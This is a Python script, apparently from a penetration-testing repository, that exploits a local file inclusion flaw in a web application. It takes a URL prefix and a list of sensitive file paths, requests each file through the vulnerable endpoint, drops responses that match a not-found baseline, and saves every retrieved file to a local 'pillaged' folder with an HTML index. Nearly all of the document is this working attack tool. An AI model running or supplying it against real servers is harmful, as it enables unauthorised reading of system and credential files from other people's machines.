#!/usr/bin/python 
# Author Justin Massey
#
# This script is helpful when you find an LFI
# You can download a pillage list at http://pwnwiki.io/presence/linux/pillage.lst
# Pillage file also included in this repo
#
# usage: pillageLFI.py "127.0.0.1/prefix/to/lfi/ "pillage.txt"
#
# url must NOT have the http(s):// prefix
# Currently hard coded for HTTP and not HTTPS
# A subdirectory named pillaged will be created in the current working directory. 
# Inside of the subdirectory you will find a index.html file.
# All files pillaged will be listed in the index.html file and a cached copy of each pillaged file will be stored in their respective sub dirs


# To do:
# add exception handling to see if request module errors out
# fix error "UnicodeEncodeError: 'ascii' codec can't encode characters in position 9239-9240: ordinal not in range(128)"

import urllib
import urllib2
import sys
import os
import requests
import argparse

parser = argparse.ArgumentParser(description='Script to extract pillage files when an LFI is discovered')
parser.add_argument('-p', required=True, dest="prefix", help="specifies the prefix of the LFI",
                    action="store")
parser.add_argument('-f', required=True, dest="file", help="specifies the text file of the filenames you wish to enumerate with the lfi",
                    action="store")

args = parser.parse_args()
prefix = args.prefix
file = open(args.file, 'r')

# The variable "localfilename" which is used below includes the subdirectories and the filename of the local file pillaged

def req(url):
    r = requests.get(url)
    return r.text

# Adds a directory if one doesnt already exist
def checkdir(localfilename):
    FILE = os.path.dirname(os.path.realpath(__file__))+"/pillaged/"+localfilename
    if not os.path.exists(os.path.dirname(FILE)):
        os.makedirs(os.path.dirname(FILE))
    

def newfile(localfilename, content):
    page = open("pillaged/"+localfilename+ ".html", 'w+')
    page.write(content)
    page.close

# This function adds a link to the pillaged file to an index.html file
def indexfile(indexfilename, remotefilename):
    page = open(indexfilename, "a")
    PAGE= os.path.realpath(__file__)
    page.write('<a href="'+os.path.dirname(PAGE)+'/pillaged/'+remotefilename+'.html ">'+remotefilename+'</a><br>\n\n')
    page.close
    

def checkbaseline(localfilename, response):
    if response != baseline:
        checkdir(localfilename)
        newfile(localfilename, response)
        indexfile("pillaged/index.html", localfilename)


baseline = req("http://"+prefix+"/random/file/that/doesnt/exist")

for DIR in file:
    localfilename = DIR.rstrip()
    url = "http://"+ prefix + localfilename
    response = req(url)
    checkbaseline(localfilename, response)

